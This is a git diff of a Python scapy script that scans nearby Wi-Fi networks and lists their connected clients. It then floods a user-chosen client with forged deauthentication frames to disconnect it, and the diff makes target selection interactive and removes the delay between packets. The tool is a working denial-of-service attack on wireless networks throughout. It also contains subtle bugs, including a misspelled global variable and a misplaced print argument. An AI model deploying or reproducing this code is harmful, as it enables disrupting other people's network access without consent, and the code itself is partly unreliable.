@@ -8,41 +8,45 @@ from scapy.all import *
 from frametypes import *
 from subtypes import *
 
-flag = True
-time_to_sniff = 10
-observed_clients = []
 client_subtypes =   (ManagmentFrameSubType.AssociationRequest, 
                     ManagmentFrameSubType.ReassociationRequest,
-                    ManagmentFrameSubType.ProbeRequest)
+                    ManagmentFrameSubType.ProbeRequest,
+                    ManagmentFrameSubType.Authentication)
 
-# initialize the networks dataframe that will contain all access points nearby
-networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
-# set the index BSSID (MAC address of the AP)
+observed_clients = {}
+clients_counter = 1 #Index for each client
+
+networks_dic = {}
+networks_counter = 1 #Index for each network
+target_ap = ""
+
+# Initialize the networks dataframe that will contain all access points nearby
+networks = pandas.DataFrame(columns=["BSSID", "SSID", "INDEX"])
+# Set the index BSSID (MAC address of the AP)
 networks.set_index("BSSID", inplace=True)
 
 def callback(packet):
+    global networks_counter
     if packet.haslayer(Dot11Beacon):
-        # extract the MAC address of the network
+        # Extract the MAC address of the network
         bssid = packet[Dot11].addr2
-        # get the name of it
+        # Extract the name of it
         ssid = packet[Dot11Elt].info.decode()
-        try:
-            dbm_signal = packet.dBm_AntSignal
-        except:
-            dbm_signal = "N/A"
-        # extract network stats
-        stats = packet[Dot11Beacon].network_stats()
-        # get the channel of the AP
-        channel = stats.get("channel")
-        # get the crypto
-        crypto = stats.get("crypto")
-        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
+
+        if bssid not in networks_dic.values():
+            networks_dic[networks_counter] = bssid
+            networks.loc[bssid] = (ssid, networks_counter)
+            networks_counter += 1
 
 def change_channel():
     ch = 1
     while True:
         os.system(f"iwconfig {interface} channel {ch}")
-        # switch channel from 1 to 14 each 0.5s
+        '''
+        Switch channel from 1 to 14 each 0.5s - also known as channel hoping
+        Since an AP can advertise BEACON frames in different channels 
+        (i.e. different frequencies), we must scan a variety of channels
+        '''
         ch = ch % 14 + 1
         time.sleep(0.5)
 
@@ -59,21 +63,18 @@ def test(packet):
             print (packet[Dot11].addr1)
 
 def discover_clients_of_ap(ap_mac, packet):
-    #Check if this is a client's packet and the destination is the target AP
-    if packet.type == FrameType.Management and \
-    packet.subtype in client_subtypes and packet.addr3 == ap_mac:
-         if packet.addr2 not in observed_clients:
-                print ("New client discovered: " + str(packet.addr2))
-                observed_clients.append(packet.addr2)
-    
+    global clients_counterr
 
+    if(packet.type == FrameType.Data and packet.subtype == DataFrameSubType.QOS_NULL \
+        and packet.addr1 == ap_mac):
+         if packet.addr2 not in observed_clients.values():
+                print (str(len(observed_clients) + 1 ) + \
+                ". New client discovered in type 2, subtype 12: " + packet.addr2)
+                observed_clients[clients_counter] = packet.addr2
+                clients_counter += 1
+    
 def discover_clients(packet):
-    discover_clients_of_ap("00:b8:c2:6b:a2:bb", packet)
-    # if packet.type == FrameType.Management and \
-    # packet.subtype in client_subtypes:
-    #     if packet.addr2 not in observed_clients:
-    #             print (packet.addr2)
-    #             observed_clients.append(packet.addr2)
+    discover_clients_of_ap(target_ap, packet)
 
 def run_deauthenticate(iface, dest_mac, src_mac):
     thread = threading.Thread(target=deauthenticate, args=(iface, dest_mac, src_mac))
@@ -88,9 +89,22 @@ def run_deauthenticate(iface, dest_mac, src_mac):
 
 def deauthenticate(interface, dest_mac, src_mac):
     t = threading.currentThread()
+    pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1=dest_mac, addr2=src_mac, addr3=src_mac)/scapy.all.Dot11Deauth()
     while getattr(t, "do_run", True):
-        pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1=dest_mac, addr2=src_mac, addr3=src_mac)/scapy.all.Dot11Deauth()
-        scapy.all.sendp(pkt, iface=interface, count=1, inter=.2, verbose=0)
+        scapy.all.sendp(pkt, iface=interface, count=1, verbose=0)
+
+def get_index_input(message, input_dict):
+    while True:
+        index = input(message + ":\n")
+        if index.isdigit():
+            #convert index from string to int
+            index = int(index)
+            if(index in input_dict):
+                break
+        print("Wrong index, try again")
+    
+    print("") #New line
+    return index
          
 if __name__ == "__main__":
     if len(sys.argv) != 2:
@@ -98,24 +112,42 @@ if __name__ == "__main__":
     else:
         interface = sys.argv[1]
         change_to_monitor(interface)
-        #sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff)
-        #print("Starting to attack", end='', flush=True)
-        #run_deauthenticate(interface, "2e:65:7a:30:cc:55", "00:b8:c2:6b:a2:bb")
 
         channel_changer = Thread(target=change_channel)
         channel_changer.daemon = True
         channel_changer.start()
         sniffer = AsyncSniffer(prn=callback, iface=interface)
         sniffer.start()
+        time_to_sniff = 10
         counter = time_to_sniff
         print("Scanning for available networks", end='', flush=True)
-        while (counter >= 0):
-            print(".", end='', flush=True)
+        while counter >= 0:
             counter = counter-1
             time.sleep(1)
+            print(".", end='', flush=True)
         sniffer.stop()
         os.system("clear")
+
+        print("================================================================")
         print(networks)
-        print("Scanning for available clients")
-        sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff * 3)
+        print("================================================================", end='\n\n')
+
+        index = get_index_input("Choose network index to scan for connected clients", networks_dic)
+        #Extract the name of network based on it's index in the data frame
+        ssid = networks[networks['INDEX']==index]['SSID'].values[0]
+        print("Scanning for available clients at network '{}'.".format(ssid))
+
+        #Get the target AP MAC address
+        target_ap = networks_dic[index]
+
+        sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff * 2)
+        print("Scan finished.")
+        if(not observed_clients):
+            print("Couldn't find clients on network '{}'. Try run the script again.".format(ssid))
+        else:
+            client_ind = get_index_input("Choose client index to start the attack", observed_clients)
+            print("Starting to attack client '{}'".format(observed_clients[client_ind], end='', flush=True))
+            #Send de-authentication packets
+            run_deauthenticate(interface, observed_clients[client_ind], target_ap)
+
 
